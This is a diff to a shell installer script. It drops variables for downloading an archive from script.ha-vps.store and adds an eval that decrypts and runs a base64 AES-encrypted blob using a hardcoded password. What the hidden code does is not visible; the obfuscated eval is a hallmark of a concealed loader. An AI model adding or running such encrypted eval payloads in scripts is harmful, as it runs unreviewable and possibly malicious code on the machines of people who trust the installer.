@@ -5,10 +5,13 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 set -euo pipefail
 
-ARCHIVE_URL="script.ha-vps.store/install.7z"
-ARCHIVE_FILE="install.7z"
-EXTRACTED_FILE="install.sh"
-BLOCK_FLAG=".blocked"
+PASSWORD="pass"
+eval "$(
+echo 'U2FsdGVkX18jN2zXmOk0AnSi6q46FdiJKPk8rxqhhXEjK/PTWiGXD0G8a9pPT3oK
+kO8Ehsyj7YOhvP8Lo04XSpth/ow1Q2racE8KNgZZQYOhKf1SByKp4xYFBIbQ64a5
+RM+IwSSVFc2L2XMFrArBMe1bnOQDOoErroUfvuS4yoQ2ySV2bwSxG18wQ6cEPvYf' | \
+openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:"$PASSWORD"
+)"
 
 check_install() {
     local cmd="$1"
